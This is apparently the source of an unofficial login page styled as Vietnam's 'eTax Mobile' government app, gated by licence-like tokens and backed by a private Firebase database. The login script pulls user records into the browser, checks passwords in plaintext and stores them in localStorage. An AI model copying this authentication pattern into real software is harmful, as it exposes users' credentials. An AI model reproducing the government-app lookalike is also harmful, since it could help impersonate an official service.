<!DOCTYPE html>
/* ===== UNIVERSAL RESPONSIVE FIX ===== */
html, body {
  margin: 0 !important;
  padding: 0 !important;
  width: 100% !important;
  height: 100% !important;
  box-sizing: border-box;
  overflow-x: hidden;
  -webkit-overflow-scrolling: touch;
}

* {
  box-sizing: border-box;
}

/* ✅ PWA VIEWPORT FIX */
@supports (padding: max(0px)) {
  .safe-area-top {
    padding-top: max(20px, env(safe-area-inset-top));
  }
  
  .safe-area-bottom {
    padding-bottom: max(20px, env(safe-area-inset-bottom));
  }
}

/* ✅ MOBILE CONTAINER FIX */
.phone-frame, .container, .main-container {
  width: 100% !important;
  max-width: 100% !important;
  margin: 0 !important;
  padding: 0 16px !important;
  overflow-x: hidden !important;
}

/* ✅ DESKTOP RESPONSIVE */
@media (min-width: 768px) {
  .phone-frame, .container, .main-container {
    max-width: 414px !important;
    margin: 0 auto !important;
    border-radius: 20px;
    box-shadow: 0 10px 40px rgba(0,0,0,0.15);
  }
}

/* ✅ PREVENT HORIZONTAL SCROLL */
body, html {
  overflow-x: hidden !important;
}

.phone-frame {
  min-height: 100vh;
  position: relative;
}

/* ✅ BOTTOM NAVIGATION FIX */
.bottom-nav {
  position: sticky;
  bottom: 0;
  left: 0;
  right: 0;
  background: rgba(255,255,255,0.95);
  backdrop-filter: blur(10px);
  border-top: 1px solid rgba(255,255,255,0.1);
  padding: 8px 0;
  z-index: 100;
}

/* ✅ INPUT AND BUTTON FIX */
input, button, select, textarea {
  font-size: 16px; /* Prevent zoom on iOS */
  border-radius: 8px;
  -webkit-appearance: none;
}

/* ✅ PREVENT DOUBLE TAP ZOOM */
* {
  touch-action: manipulation;
}
<html lang="vi">
<head>
<!-- PWA Meta Tags -->
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<meta name="apple-mobile-web-app-title" content="eTax Mobile">
<meta name="mobile-web-app-capable" content="yes">
<meta name="theme-color" content="#d62828">

<!-- PWA Icons -->
<link rel="apple-touch-icon" href="assets/logo.png">
<link rel="icon" type="image/png" href="assets/logo.png">
<link rel="manifest" href="manifest.json">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

<style>
body {
    margin: 0;
    padding: 0;
    font-family: 'Roboto', sans-serif;
    color: white;
    min-height: 100vh;
    background-position: center center;
    overflow-y: auto;
    animation: fadeIn 1.2s ease-in;
}

@keyframes fadeIn {
    0% { opacity: 0; }
    100% { opacity: 1; }
}

* {
    touch-action: manipulation;
    -webkit-overflow-scrolling: touch;
    -webkit-tap-highlight-color: transparent;
    box-sizing: border-box;
}

.container {
    width: 100%;
    max-width: 420px;
    margin: 0 auto;
    padding: 24px 16px;
    display: flex;
    flex-direction: column;
    justify-content: flex-start;
    min-height: 100vh;
    background: rgba(0, 0, 0, 0.4);
    backdrop-filter: blur(2px);
    animation: fadeIn 1s ease-in-out;
}

.logo-wrapper { 
    text-align: center; 
    margin-top: 32px; 
    margin-bottom: 12px; 
}

.logo { 
    width: 90px; 
    margin-bottom: 8px; 
}

.title { 
    font-size: 20px; 
    font-weight: 500; 
}

.login-form { 
    display: flex; 
    flex-direction: column; 
    gap: 14px; 
    align-items: stretch; 
    animation: fadeIn 1.5s ease-in-out; 
}

.form-group { 
    display: flex; 
    flex-direction: column; 
    align-items: flex-start; 
    position: relative; 
}

.form-group label { 
    font-size: 13px; 
    margin-bottom: 4px; 
    color: #fff; 
}

.form-group input {
    width: 100%; 
    padding: 12px 12px 12px 44px; 
    border: none; 
    border-radius: 8px;
    font-size: 15px; 
    background-color: transparent; 
    border-bottom: 1px solid white;
    color: white; 
    outline: none;
}

.links { 
    display: flex; 
    justify-content: space-between; 
    font-size: 13px; 
    color: yellow; 
    margin: -5px 0 10px; 
}

.links a { 
    color: yellow; 
    text-decoration: none; 
}

.btn-login {
    background-color: #e60000; 
    color: #fff; 
    padding: 14px; 
    font-size: 16px;
    border: none; 
    border-radius: 25px; 
    font-weight: bold; 
    position: relative;
    cursor: pointer;
    transition: all 0.3s ease;
}

.btn-login:hover {
    background-color: #cc0000;
    transform: translateY(-1px);
}

.btn-login:disabled {
    background-color: #666;
    cursor: not-allowed;
    transform: none;
}

.btn-id { 
    display: flex; 
    align-items: center; 
    justify-content: space-between; 
    background: #fff;
    border-radius: 12px; 
    padding: 12px 16px; 
    color: #000; 
    gap: 8px; 
    margin-top: 10px;
}

.text-box { 
    display: flex; 
    flex-direction: column; 
    flex-grow: 1; 
}

.phone-frame {
    width: 400px; 
    height: 900px; 
    background-image: url('assets/bglogin.png');
    border-radius: 30px; 
    background-size: contain; 
    background-repeat: no-repeat;
    background-position: center center; 
    overflow: hidden;
    box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
    display: flex; 
    flex-direction: column; 
    background-color: #ffffff;
}

.line1, .line2 { 
    font-size: 14px; 
    text-align: center; 
}

.line2 { 
    font-weight: bold; 
    margin-top: 2px; 
}

.icon-wrap img { 
    height: 36px; 
    object-fit: contain; 
}

.register { 
    text-align: center; 
    font-size: 13px; 
}

.register a { 
    color: yellow; 
    text-decoration: none; 
}

.bottom-nav { 
    display: flex; 
    justify-content: space-around; 
    font-size: 12px; 
    padding: 0;
    border-top: 1px solid rgba(255, 255, 255, 0.1);
}

.bottom-nav div { 
    text-align: center; 
}

.bottom-nav img { 
    height: 32px; 
    margin-bottom: 4px; 
}

.input-icon-wrap { 
    position: relative; 
    width: 100%; 
    display: flex; 
    align-items: center; 
}

.input-icon-wrap i.fa-user-large, .input-icon-wrap i.fa-lock {
    position: absolute; 
    left: 14px; 
    color: #bdbdbd; 
    font-size: 20px; 
    top: 50%; 
    transform: translateY(-50%); 
    z-index: 2;
}

.input-icon-wrap i.fa-eye, .input-icon-wrap i.fa-eye-slash {
    position: absolute; 
    right: 14px; 
    color: #bdbdbd; 
    font-size: 20px; 
    top: 50%; 
    transform: translateY(-50%); 
    z-index: 2; 
    cursor: pointer;
}

.input-icon-wrap input { 
    padding-left: 44px; 
    padding-right: 44px; 
}

html, body {
    margin: 0 !important;
    padding: 0 !important;
    min-height: 100vh;
    min-width: 100vw;
    width: 100vw;
    background: #000 !important;
    box-sizing: border-box;
    overflow-x: hidden !important;
    display: flex;
    flex-direction: column;
    justify-content: flex-start;
    align-items: center;
}

body {
    padding: 0 !important;
    min-height: 100vh;
    min-width: 100vw;
    width: 100vw;
    box-sizing: border-box;
    background: #000 !important;
}

.phone-frame {
    width: 100vw !important;
    background-image: url('assets/bglogin.png');
    background-size: cover;
    background-repeat: no-repeat;
    background-position: center center;
    border-radius: 0 !important;
    margin: 0 auto !important;
    box-shadow: none !important;
    display: flex;
    flex-direction: column;
    justify-content: flex-start;
    align-items: stretch;
}

@media (min-width: 601px) {
    .phone-frame {
        margin: 32px auto !important;
        box-shadow: 0 0 20px rgba(0,0,0,0.3) !important;
        width: 400px !important;
    }
}

.btn-login {
    width: 100%;
    max-width: 340px;
    margin: 0 auto;
    display: block;
}

.login-form, .container {
    width: 100%;
    max-width: 340px;
    margin: 0 auto;
}

/* ✅ Loading Animation */
.loading-spinner {
    display: inline-block;
    width: 16px;
    height: 16px;
    border: 2px solid #ffffff;
    border-radius: 50%;
    border-top-color: transparent;
    animation: spin 1s ease-in-out infinite;
}

@keyframes spin {
    to { transform: rotate(360deg); }
}

/* ✅ Success Message */
.success-message {
    background: linear-gradient(135deg, #4caf50, #66bb6a);
    color: white;
    padding: 12px 20px;
    border-radius: 8px;
    margin: 10px 0;
    text-align: center;
    font-weight: 500;
    animation: slideInFromTop 0.5s ease-out;
}

@keyframes slideInFromTop {
    from {
        opacity: 0;
        transform: translateY(-20px);
    }
    to {
        opacity: 1;
        transform: translateY(0);
    }
}

/* ✅ Error Message */
.error-message {
    background: linear-gradient(135deg, #f44336, #e57373);
    color: white;
    padding: 12px 20px;
    border-radius: 8px;
    margin: 10px 0;
    text-align: center;
    font-weight: 500;
    animation: shake 0.5s ease-in-out;
}

@keyframes shake {
    0%, 20%, 40%, 60%, 80%, 100% {
        transform: translateX(0);
    }
    10%, 30%, 50%, 70%, 90% {
        transform: translateX(-5px);
    }
}
</style>

<!-- Firebase CDN -->
<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>

<script>
// ===== CHỨC NĂNG KIỂM TRA TOKEN - ĐÃ SỬA =====
document.addEventListener('DOMContentLoaded', function() {
    console.log('=== LOGIN PAGE DEBUG ===');
    console.log('Token verified:', localStorage.getItem('etax_token_verified'));
    console.log('Device verified:', localStorage.getItem('etax_device_verified'));
    console.log('User logged in:', localStorage.getItem('etax_logged_in_user'));
    
    checkTokenVerification();
});

function checkTokenVerification() {
    const tokenVerified = localStorage.getItem('etax_token_verified');
    const deviceVerified = localStorage.getItem('etax_device_verified');
    const userLoggedIn = localStorage.getItem('etax_logged_in_user');
    
    // ✅ QUAN TRỌNG: Nếu user đã đăng nhập rồi, cho phép bypass token check
    if (userLoggedIn) {
        console.log('✅ User đã đăng nhập, bypass token check');
        initializeLoginPage();
        return;
    }
    
    // Nếu chưa verify token, chuyển về token-login
    if (tokenVerified !== 'true' || deviceVerified !== 'true') {
        console.log('❌ Token chưa được verify, chuyển về token-login');
        setTimeout(() => {
            window.location.href = 'token-login.html';
        }, 100);
        return;
    }
    
    console.log('✅ Token đã verify, có thể đăng nhập');
    initializeLoginPage();
}

function initializeLoginPage() {
    console.log('🚀 Khởi tạo trang login thành công');
    
    // Focus vào field đầu tiên
    const firstInput = document.getElementById('tax-id');
    if (firstInput) {
        setTimeout(() => firstInput.focus(), 500);
    }
    
    // Kiểm tra nếu có thông tin user đã lưu
    const savedUser = localStorage.getItem('etax_logged_in_user');
    if (savedUser) {
        document.getElementById('tax-id').value = savedUser;
        // Focus vào password field
        setTimeout(() => {
            document.getElementById('password').focus();
        }, 600);
    }
}

// ✅ Error handling cho Firebase
window.addEventListener('error', function(event) {
    console.error('Login page error:', event.error);
    
    if (event.error.message.includes('Firebase') || event.error.message.includes('network')) {
        showMessage('❌ Có lỗi kết nối. Vui lòng thử lại.', 'error');
    }
});
</script>
</head>
<body>
    <div class="phone-frame p-3">
        <div class="blur-overlay"></div>
        <div class="logo-wrapper">
            <img src="assets/logo.png" alt="Logo Thuế" class="logo" />
            <h1 class="title">eTax Mobile</h1>
        </div>
        <div style="margin: 42px;"></div>
        
        <!-- ✅ Message Container -->
        <div id="messageContainer"></div>
        
        <form class="login-form" onsubmit="return false;">
            <div class="form-group" id="tax-id-group">
                <label for="tax-id" style="padding-left: 44px;">Mã số thuế</label>
                <div class="input-icon-wrap">
                    <i class="fa-solid fa-user-large"></i>
                    <input type="text" id="tax-id" placeholder="Mã số thuế" />
                </div>
            </div>
            <div class="form-group password-group">
                <label for="password" style="padding-left: 44px;">Mật khẩu</label>
                <div class="input-icon-wrap">
                    <i class="fa-solid fa-lock"></i>
                    <input type="password" id="password" placeholder="Mật khẩu" />
                    <i class="fa-solid fa-eye" id="togglePassword" onclick="togglePassword()"></i>
                </div>
            </div>
            <div class="links">
                <a href="#">Quên tài khoản (mã số thuế)?</a>
                <a href="#">Quên mật khẩu?</a>
            </div>
            <button type="button" class="btn-login" id="loginBtn" onclick="login()">
                Đăng nhập
            </button>
            <div style="margin: 10px;"></div>
            <div class="btn-id">
                <div class="text-box">
                    <div class="line1">Đăng nhập bằng tài khoản</div>
                    <div class="line2">Định danh điện tử</div>
                </div>
                <div class="icon-wrap">
                    <img src="assets/vnid.png" alt="VNeID" />
                </div>
            </div>
        </form>
        <p class="register">Bạn chưa có tài khoản? <a href="#">Đăng ký ngay</a></p>
        <div style="margin: 60px;"></div>
        <div class="bottom-nav" style="height: 60px;">
            <div class="flex flex-column items-center">
                <img src="assets/icon-qr.png" />
                <div>QR tem</div>
            </div>
            <div class="flex flex-column items-center">
                <img src="assets/tienich.png" />
                <div>Tiện ích</div>
            </div>
            <div class="flex flex-column items-center">
                <img src="assets/hotro.png" />
                <div>Hỗ trợ</div>
            </div>
            <div class="flex flex-column items-center">
                <img src="assets/chiase.png" />
                <div>Chia sẻ</div>
            </div>
        </div>
    </div>
    
    <script>
        // ===== FIREBASE CONFIGURATION =====
        const firebaseConfig = {
            apiKey: "AIzaSyD_rJgBulheVenQUE2KXr4PBpSpTCxw",
            authDomain: "etax-7fbf8.firebaseapp.com",
            databaseURL: "https://etax-7fbf8-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "etax-7fbf8"
        };
        firebase.initializeApp(firebaseConfig);

        // ===== MAIN LOGIN FUNCTION - ĐÃ NÂNG CẤP =====
        async function login() {
            const userId = document.getElementById("tax-id").value.trim();
            const password = document.getElementById("password").value.trim();
            const loginBtn = document.getElementById("loginBtn");

            // Validation
            if (!userId || !password) {
                showMessage("❌ Vui lòng nhập đầy đủ Mã số thuế và Mật khẩu", "error");
                return;
            }

            // Set loading state
            setButtonLoading(loginBtn, true);

            try {
                // ✅ Xác thực với Firebase
                const snapshot = await firebase.database().ref("users/" + userId).once("value");
                
                if (snapshot.exists()) {
                    const userData = snapshot.val();
                    
                    if (userData.password === password) {
                        // ✅ Đăng nhập thành công
                        await handleSuccessfulLogin(userId, userData);
                    } else {
                        showMessage("❌ Sai mật khẩu. Vui lòng thử lại.", "error");
                    }
                } else {
                    showMessage("❌ Không tìm thấy người dùng với MST này.", "error");
                }
                
            } catch (error) {
                console.error("Login error:", error);
                showMessage("❌ Có lỗi kết nối. Vui lòng thử lại sau.", "error");
            } finally {
                setButtonLoading(loginBtn, false);
            }
        }

        // ===== HANDLE SUCCESSFUL LOGIN =====
        async function handleSuccessfulLogin(userId, userData) {
            console.log('🎉 Đăng nhập thành công cho user:', userId);
            
            // ✅ Lưu thông tin user vào localStorage
            localStorage.setItem("etax_logged_in_user", userId);
            localStorage.setItem("etax_user_info", JSON.stringify({
                mst: userId,
                name: userData.name,
                address: userData.address || "",
                taxoffice: userData.taxoffice || "",
                date: userData.date,
                password: userData.password,
                role: userData.role,
                token: userData.linkedToken || userData.token,
                duration: userData.duration
            }));
            
            // ✅ QUAN TRỌNG: Lưu trạng thái đăng nhập để bypass token check
            localStorage.setItem("etax_login_success", "true");
            localStorage.setItem("etax_login_timestamp", Date.now().toString());
            
            // ✅ Log activity (nếu cần)
            try {
                await firebase.database().ref('activityLogs').push({
                    type: 'user_login',
                    userId: userId,
                    timestamp: Date.now(),
                    details: `User ${userId} đăng nhập thành công`,
                    deviceInfo: getUserAgent()
                });
            } catch (logError) {
                console.warn('Failed to log activity:', logError);
            }
            
            // ✅ Hiển thị thông báo thành công
            showMessage("🎉 Đăng nhập thành công! Đang chuyển hướng...", "success");
            
            // ✅ Chuyển hướng sau 1.5 giây
            setTimeout(() => {
                window.location.href = "index.html";
            }, 1500);
        }

        // ===== HELPER FUNCTIONS =====

        // Toggle password visibility
        function togglePassword() {
            const passwordInput = document.getElementById("password");
            const eyeIcon = document.getElementById("togglePassword");
            
            if (passwordInput.type === "password") {
                passwordInput.type = "text";
                eyeIcon.classList.remove("fa-eye");
                eyeIcon.classList.add("fa-eye-slash");
            } else {
                passwordInput.type = "password";
                eyeIcon.classList.remove("fa-eye-slash");
                eyeIcon.classList.add("fa-eye");
            }
        }

        // Set button loading state
        function setButtonLoading(button, loading) {
            if (loading) {
                button.disabled = true;
                button.innerHTML = '<span class="loading-spinner"></span> Đang đăng nhập...';
            } else {
                button.disabled = false;
                button.innerHTML = 'Đăng nhập';
            }
        }

        // Show message to user
        function showMessage(message, type = 'info') {
            const container = document.getElementById('messageContainer');
            
            // Remove existing messages
            container.innerHTML = '';
            
            // Create new message
            const messageDiv = document.createElement('div');
            messageDiv.className = type === 'error' ? 'error-message' : 'success-message';
            messageDiv.textContent = message;
            
            container.appendChild(messageDiv);
            
            // Auto-hide after 5 seconds for non-success messages
            if (type !== 'success') {
                setTimeout(() => {
                    messageDiv.remove();
                }, 5000);
            }
        }

        // Get user agent info
        function getUserAgent() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                timestamp: Date.now()
            };
        }

        // ===== KEYBOARD SUPPORT =====
        document.addEventListener('keydown', function(event) {
            if (event.key === 'Enter') {
                event.preventDefault();
                login();
            }
        });

        // ===== AUTO-FILL SUPPORT =====
        document.getElementById('tax-id').addEventListener('input', function() {
            // Remove any non-numeric characters for MST
            const value = this.value.replace(/[^0-9]/g, '');
            if (this.value !== value) {
                this.value = value;
            }
        });

        // ===== PERFORMANCE MONITORING =====
        window.addEventListener('load', function() {
            console.log('✅ Login page fully loaded');
            
            // Check for slow loading
            const loadTime = performance.now();
            if (loadTime > 3000) {
                console.warn('⚠️ Slow page load detected:', loadTime + 'ms');
            }
        });

        console.log('🚀 Login.html initialized successfully');
    </script>
</body>
</html>